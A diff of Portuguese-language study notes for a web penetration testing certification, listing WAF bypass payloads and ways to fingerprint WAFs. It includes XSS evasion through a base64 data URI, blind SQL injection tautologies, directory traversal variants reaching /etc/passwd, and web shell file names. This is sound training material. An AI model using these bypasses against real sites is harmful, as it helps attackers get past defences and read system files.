@@ -1,4 +1,3 @@
-#INE #WebHacking #eWPTX
 ## Regras simples para Bypass em WAF
 ### Cross-site Scripting
 
@@ -27,6 +26,7 @@
 | Usado normalmente | Melhor Opção |
 | --- | --- |
 | javascript:alert(document.cookie) | data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4= |
+
 ### Blind SQL Injection
 
 | Usado normalmente | Melhor Opção |
@@ -35,11 +35,13 @@
 |  | 'or 0x47=0x47 |
 |  | or char(32)='' |
 |  | or 6 is not null |
+
 ### SQL Injection
 
 | Usado normalmente | Melhor Opção |
 | --- | --- |
 | UNION SELECT | UNION ALL SELECT |
+
 ### Directory Traversal
 
 | Usado normalmente | Melhor Opção |
@@ -48,6 +50,7 @@
 |  | /etc//passwd |
 |  | /etc/ignore/../passwd |
 |  | /etc/passwd............. |
+
 ### Web Shell
 
 | Usado normalmente | Melhor Opção |
@@ -57,6 +60,7 @@
 | shell.aspx |  |
 | cmd.jsp |  |
 | CmdAsp.asp |  |
+
 ## WAF Detection and Fingerprinting
 ### Valor de Cookie
 
@@ -67,27 +71,35 @@
 	^TS\[a-zA-Z0-9]{3,6}```
 
 **Barracuda** -> Usa 2 cookies: ```barra_counter_session``` e ```BNI__BARRACUDA_LB_COOKIE```
+
 ### Header Rewrite
 
 Alguns WAFs reescrevem os HTTP headers modificando o "Server" ou removendo dependendo da requisição
+
 ### HTTP Response Code
 
 Alguns WAFs modificam o HTTP response code se a requisição for hostil
 
 **mod_security** -> ```406 Not Acceptable```
+
 **AQTRONIX WebKnight** -> ```999 No Hacking```
+
 ### HTTP Response Body
 
 É possível detectar a presença de um WAF no response body
+
 #### mod_security
 
-![[Pasted image 20231219195354.png]]
+![](https://github.com/SQU4NCH/eWPTX-Study-Notes/blob/main/Imagens/Pasted%20image%2020231219195354.png)
+
 #### AQTRONIX WebKnight
 
-![[Pasted image 20231219195403.png]]
+![](https://github.com/SQU4NCH/eWPTX-Study-Notes/blob/main/Imagens/Pasted%20image%2020231219195403.png)
+
 #### dotDefender
 
-![[Pasted image 20231219195413.png]]
+![](https://github.com/SQU4NCH/eWPTX-Study-Notes/blob/main/Imagens/Pasted%20image%2020231219195413.png)
+
 ### Close Connection
 
 Uma função interessante presente em alguns WAFs é a ```close connection```, que serve para dropar conexões em caso de requisições maliciosas
